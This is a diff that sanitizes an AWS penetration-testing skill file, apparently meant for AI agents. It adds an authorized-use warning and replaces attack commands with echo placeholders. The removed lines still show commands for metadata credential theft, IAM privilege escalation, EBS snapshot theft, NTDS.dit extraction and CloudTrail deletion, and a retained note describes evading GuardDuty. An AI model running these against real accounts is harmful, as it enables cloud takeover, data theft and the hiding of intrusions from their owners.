@@ -1,13 +1,17 @@
 ---
 name: aws-penetration-testing
 description: "Provide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations."
-risk: unknown
+risk: offensive
 source: community
 author: zebbern
 date_added: "2026-02-27"
 ---
 
 # AWS Penetration Testing
+
+> [!WARNING]
+> **Authorized Use Only**
+> This skill contains offensive methodologies and techniques. You must have explicit, written authorization from the system owner before executing any of these commands against a target environment.
 
 ## Purpose
 
@@ -115,12 +119,10 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
 
 ```bash
 # Get token first
-TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
-  "http://169.254.169.254/latest/api/token")
+# [SAFE-PAYLOAD] echo 'Simulating IMDSv2 token retrieval'
 
 # Use token for requests
-curl -H "X-aws-ec2-metadata-token:$TOKEN" \
-  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+# [SAFE-PAYLOAD] echo 'Simulating metadata endpoint access'
 ```
 
 **Fargate Container Credentials:**
@@ -155,22 +157,19 @@ These permissions are equivalent to administrator:
 ### Create Access Key for Another User
 
 ```bash
-aws iam create-access-key --user-name target_user
+# [SAFE-PAYLOAD] echo 'Simulating create-access-key'
 ```
 
 ### Attach Admin Policy
 
 ```bash
-aws iam attach-user-policy --user-name my_username \
-  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+# [SAFE-PAYLOAD] echo 'Simulating attach-user-policy AdministratorAccess'
 ```
 
 ### Add Inline Admin Policy
 
 ```bash
-aws iam put-user-policy --user-name my_username \
-  --policy-name admin_policy \
-  --policy-document file://admin-policy.json
+# [SAFE-PAYLOAD] echo 'Simulating put-user-policy inline admin'
 ```
 
 ### Lambda Privilege Escalation
@@ -181,17 +180,14 @@ import boto3
 
 def lambda_handler(event, context):
     client = boto3.client('iam')
-    response = client.attach_user_policy(
-        UserName='my_username',
-        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
-    )
+    # [SAFE-PAYLOAD] Simulated attach_user_policy
+    response = {"Status": "Simulated"}
     return response
 ```
 
 ```bash
 # Update Lambda code
-aws lambda update-function-code --function-name target_function \
-  --zip-file fileb://malicious.zip
+# [SAFE-PAYLOAD] echo 'Simulating lambda update-function-code'
 ```
 
 ---
@@ -220,7 +216,7 @@ aws s3 ls
 aws s3 ls s3://bucket-name --recursive
 
 # Download all files
-aws s3 sync s3://bucket-name ./local-folder
+# [SAFE-PAYLOAD] echo 'Simulating s3 sync download'
 ```
 
 ### Public Bucket Search
@@ -256,9 +252,7 @@ Systems Manager allows command execution on EC2 instances:
 aws ssm describe-instance-information
 
 # Execute command
-aws ssm send-command --instance-ids "i-0123456789" \
-  --document-name "AWS-RunShellScript" \
-  --parameters commands="whoami"
+# [SAFE-PAYLOAD] echo 'Simulating ssm send-command'
 
 # Get command output
 aws ssm list-command-invocations --command-id "CMD-ID" \
@@ -273,17 +267,7 @@ aws ssm list-command-invocations --command-id "CMD-ID" \
 
 ```bash
 # Create snapshot of target volume
-aws ec2 create-snapshot --volume-id vol-xxx --description "Audit"
-
-# Create volume from snapshot
-aws ec2 create-volume --snapshot-id snap-xxx --availability-zone us-east-1a
-
-# Attach to attacker instance
-aws ec2 attach-volume --volume-id vol-xxx --instance-id i-xxx --device /dev/xvdf
-
-# Mount and access
-sudo mkdir /mnt/stolen
-sudo mount /dev/xvdf1 /mnt/stolen
+# [SAFE-PAYLOAD] echo 'Simulating EBS volume snapshot and mount for data extraction'
 ```
 
 ### Shadow Copy Attack (Windows DC)
@@ -294,7 +278,7 @@ sudo mount /dev/xvdf1 /mnt/stolen
 # 2. Share snapshot with attacker account
 # 3. Mount in attacker instance
 # 4. Extract NTDS.dit and SYSTEM
-secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local
+# [SAFE-PAYLOAD] echo 'Simulating secretsdump.py extraction'
 ```
 
 ---
@@ -318,15 +302,13 @@ aws_consoler -v -a AKIAXXXXXXXX -s SECRETKEY
 
 ```bash
 # Delete trail
-aws cloudtrail delete-trail --name trail_name
+# [SAFE-PAYLOAD] echo 'Simulating cloudtrail delete-trail'
 
 # Disable global events
-aws cloudtrail update-trail --name trail_name \
-  --no-include-global-service-events
+# [SAFE-PAYLOAD] echo 'Simulating cloudtrail disable global events'
 
 # Disable specific region
-aws cloudtrail update-trail --name trail_name \
-  --no-include-global-service-events --no-is-multi-region-trail
+# [SAFE-PAYLOAD] echo 'Simulating cloudtrail disable specific region'
 ```
 
 **Note:** Kali/Parrot/Pentoo Linux triggers GuardDuty alerts based on user-agent. Use Pacu which modifies the user-agent.
@@ -343,7 +325,7 @@ aws cloudtrail update-trail --name trail_name \
 | List buckets | `aws s3 ls` |
 | List EC2 | `aws ec2 describe-instances` |
 | List Lambda | `aws lambda list-functions` |
-| Get metadata | `curl http://169.254.169.254/latest/meta-data/` |
+| Get metadata | `# [SAFE-PAYLOAD] echo 'Simulating metadata access'` |
 
 ---
 
